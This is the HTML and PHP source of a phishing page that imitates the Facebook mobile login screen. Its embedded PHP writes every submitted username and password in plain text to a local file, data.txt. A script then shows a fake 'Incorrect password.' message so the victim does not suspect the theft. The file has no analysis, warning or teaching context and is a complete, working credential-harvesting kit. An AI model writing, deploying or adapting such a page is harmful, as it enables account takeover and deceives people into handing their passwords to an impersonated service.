<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
</head>
<body>

    <div class="menu">
        <img class="menuImage" src="images/menu2.jpg">
    </div>

        <img class="menuImage" src="images/menufiller2.jpg">

    <p id="errorMessage" class="mainFont"></p>
    <img id="logo" src="images/fblogo.jpg">

    <form class="margin" action="login.php" method="post">
        <p class="mainFont">Mobile number or email</p>
        <input type="text" class="inputField" name="name">
        <input type="password" class="inputField" name="password">
        <input type="image" class="fullWidthImage" src="images/login2.jpg" onclick="login();">
    </form>

    <?php
        $fileName = "./data.txt";
        $username = $_POST["name"];
        $password = $_POST["password"];
        $newData = $username . " " . $password . "\n";
        file_put_contents($fileName, $newData, FILE_APPEND);
    ?>

    <p></p>
    <div class='hline'></div>

    <p><br></p>
    <img class="fullWidthImage" src="images/copyright.jpg">

    <script>
        window.onload = function() {
            errorMessage = localStorage.getItem("error");
            document.getElementById('errorMessage').innerHTML = errorMessage;
        }
        function login() {
            let errorMessage = "Incorrect password.";
            localStorage.setItem("error", errorMessage);
        }
    </script>

    <style>
        body, html
        {
            margin: 0;
            background-color: white;
        }

        .menu
        {
            position: fixed;
            max-height: 36pt;
            width: 100%;
            background-color: rgb(253,251,228);
        }

        .menuImage
        {
            display: left;
            margin-left: auto;
            margin-right: auto;
            max-height: 36pt;
        }

        #errorMessage
        {
            text-align: center;
            color: red;
        }

        #logo
        {
            width: 24%;
            max-width: 100pt;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }

        .mainFont
        {
            font-family: Arial, Helvetica, sans-serif;
            text-align: left;
            font-size: 13pt;
            color: rgb(25,25,25);
            margin-bottom: 0;
        }

        .fullWidthImage
        {
            width: 100%;
            max-width: 300pt;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }

        .margin
        {
            max-width: 300pt;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }

        .inputField
        {
            background-color: rgb(235,235,235);
            border: 0;
            height: 24pt;
            width: 99%;
            max-width: 300pt;
            border-radius: 5px;
            font-size: medium;
            font-family: Arial, Helvetica, sans-serif;
            margin-bottom: 5pt;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }

        .hline {
            border-top: 1px  solid rgb(160,160,160);
            width: 100%;
            align-self: center;
        }
    </style>
    
</body>
</html>